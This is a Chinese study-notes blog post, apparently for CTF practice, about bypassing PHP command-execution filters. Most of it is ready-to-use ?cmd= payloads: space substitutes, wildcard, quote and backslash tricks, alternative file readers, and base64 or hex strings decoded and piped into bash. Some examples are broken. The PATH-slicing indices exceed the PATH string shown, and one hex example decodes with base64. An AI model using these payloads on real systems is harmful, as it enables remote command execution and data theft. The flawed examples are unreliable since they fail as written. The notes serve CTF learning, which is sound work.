---
title: PHP命令执行过滤绕过
categories:
  - 学习
tags:
  - 命令执行
abbrlink: f7f3e4df
---

### 过滤函数

**`preg_replace`**

`preg_replace('A','B',$cmd) 若$cmd含有A中的内容，则被B替换`

`preg_replace('/<.*?>/', '', $user_input); 过滤了<.*?>`

`preg_replace('# #','',$cmd) 过滤了空格，将空格直接从$cmd中删除`

###  空格过滤绕过

#### 绕过方法

**大括号`{cat,flag.txt}`**

`{A(命令),B(命令执行参数)}`

```
?cmd=system('{cat,flag.php}')
```

**$IFS代替空格**

可用**`$IFS`** **`${IFS}`** **`$IFS$9`**代替空格

在Linux下，以上环境变量可以起到空格的作用

直接使用**`$IFS`**可能被Linux认为是参数，因此可以使用**`${IFS}`**来确保起到空格作用

```
?cmd=system('cat${IFS}flag.php')
```

**重定向字符`<``<>`**

`<`表示的是输入重定向，即把`<`后面跟的**文件**取代键盘作为新的输入设备

```
?cmd=system('cat<flag.php')
```

**URL编码**

`Tab URL编码 %09` `space URL编码 %20`

一般过滤了空格同时也过滤了%20,所以推荐使用`%09`成功率更高

```
?cmd=system('cat%09flag.php')
```



### 文件名过滤

```php
过滤了flag,system,php
若输入的$cmd中包含其中之一，则不执行语句
if(!preg_match("/flag|system|php/i",$cmd)){
    eval($cmd);
}
else{
    echo"命令有问题哦！";
}
```

#### 绕过方法

**通配符`?` `*`绕过**

**`?`**作用：在Linux中可以替代字母。仅代表单个字符串，但此单字必须存在

**`*`**作用：在Linux中进行模糊匹配。可以代表任何字符串

```
('cat f?ag.p?p')
```

**单引号、双引号绕过**

`''` `""` 被解释为空字符 

```
?cmd=passthru('cat fl"ag.p"hp') 可以通过过滤检测，而Linux在执行语句时会自动将\反斜杠符号省略
因此，执行
?cmd=passthru('cat flag.php')

```

**建议**

```
若('')内使用单引号双引号绕过可以使用双引号
('cat fl"ag.p"hp')不会出现闭合问题
若仍要使用单引号可以使用反斜杠使得'失去功能性
('cat fl\'ag.ph\'p')
```

**反斜杠`\`绕过**

**`\`**作用：去掉特殊字符功能性，单纯表示为字符串；命令连接符

```
?cmd=passthru('cat fl\ag.p\hp') 可以通过过滤检测，而Linux在执行语句时会自动将\反斜杠符号省略
因此，执行
?cmd=passthru('cat flag.php')
```

**特殊变量**

`$1到$9、$@、$*等`

类似于单引号双引号绕过，可以通过过滤检查，但Linux会将其识别为空

```
?cmd=passthru('cat fl$9ag.p$@hp') 可以通过过滤检测，而Linux在执行语句时会自动将特殊变量省略
因此，执行
?cmd=passthru('cat flag.php')

```

**内联执行** 

自定义字符串，再拼接起来

```
?cmd=passthru('a=f;b=ag;c=l;cat $a$b$c.txt')
表示cat flag.txt
```

**利用Linux的环境变量**

*使用方法：**

`${PATH：5:1}指的是从环境变量的第五个字符开始取一个字符`

Linux中环境变量中含有字母，可以通过环境变量组成`flag.php`

`echo $PATH 获取环境变量（PATH要大写）`

```
echo $PATH; 获取环境变量（PATH要大写）
获取到的环境变量
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
利用环境变量
?cmd=passthru('cat f${PATH:5:1}${PATH:8:1}${PATH:66:1}.${PATH:93:1}'h${PATH:93:1});
等同于?cmd=passthru('cat flag.php');
```

### 文件读取命令过滤绕过

```php
tac more less tail nl od xxd sort  uniq file-f grep

过滤了flag,php,cat ,sort,shell
若输入的$cmd中包含其中之一，则不执行语句
if(!preg_match("/flag|cat|php|sort|shell/i",$cmd)){
    eval($cmd);
}
else{
    echo"命令有问题哦！";
}
```

**tac**

**作用：**反向显示

```
输入cat flag.php 输出 A B C D
输入tac flag.php 输出 D C B A
```

**more**

**作用：**一页一页的显示档案内容

`?cmd=passthru("more flag.php");`

**less**

**作用：**与`more`类似

**tail**

**作用：**查看末尾几行(默认显示最后十行)

`?cmd=passthru("tail flag.php")`

**nl**

**作用:**类似`cat`，但会在文件前面加上序号

**od**

**作用:**以二进制方式读取文件内容

`?cmd=passthru("od flag.php"); 显示二进制`

`?cmd=passthru("od -A d -c flag.php"); 将二进制转化成字符`

**xxd**

**作用:**类似od，以二进制方式读取文件内容（但在旁边会显示编码之后的内容）

**sort**

**作用：**主要用于排序文件

`?cmd=passthru("sort flag.php")`

**uniq**

**作用：** 可直接当`cat`使用

**file -f**

**作用：**报错出具体内容

`?cmd=passthru("file -f flag.php")`

**grep**

**作用：**在文本中查找指定字符串

`grep [选项] "搜索模式" [文件或目录...]`

`?cmd=passthru("grep { fl*")`

### 编码绕过

**base64编码**

```
cat flag.php    base64编码->  Y2F0IGZsYWcucGhw
#echo Y2F0IGZsYWcucGhw | base64 -d
|把前面指令执行的结果，变成后面指令的参数
cat flag.php  解码读取命令
#echo Y2F0IGZsYWcucGhw | base64 -d |bash  执行命令
|把cat flag.php,放在bash里执行

以下形式都可
bash、sh、/bin/bash、反引号等
?cmd=passthru('echo "Y2F0IGZsYWcucGhw"|base64 -d|bash');
?cmd=passthru('`echo "Y2F0IGZsYWcucGhw"|base64 -d`');
```

只要目标系统支持，`sh(优先使用，兼容性最广)`、`zsh`、`eval` 等均可替代 `bash` 执行命令。

```
# 优先尝试 sh（兼容性最广）
echo <base64_payload> | base64 -d | sh

# 若失败，尝试其他解释器
echo <base64_payload> | base64 -d | python3
echo <base64_payload> | base64 -d | php
```

**base32**

和`base64`使用方式相同，只是编码形式不一样而已

**HEX编码**

```
cat flag.php    HEX编码->  63617420666C61672E706870
#echo 63617420666C61672E706870 | xxd -r -p
|把前面指令执行的结果，变成后面指令的参数
-r -p将纯16进制存储的内容反向输出打印为ASCII格式
cat flag.php  解码读取命令
#echo 63617420666C61672E706870 | base64 -d |bash  执行命令
|把cat flag.php,放在bash里执行

以下形式都可
bash、sh、/bin/bash、反引号等
?cmd=passthru('echo "63617420666C61672E706870"|xxd -r -p|bash');
?cmd=passthru('`echo "63617420666C61672E706870"|xxd -r -p`');
```

**shellcode编码**

如果对方服务器没有安装xxd，则可以使用`shellcode编码`

~~不想写了~~

和上面的方法没什么区别，就是编码方式不同了而已

既可以使用`echo`，也可以使用`printf`（一个使用不了就换另一个使用）
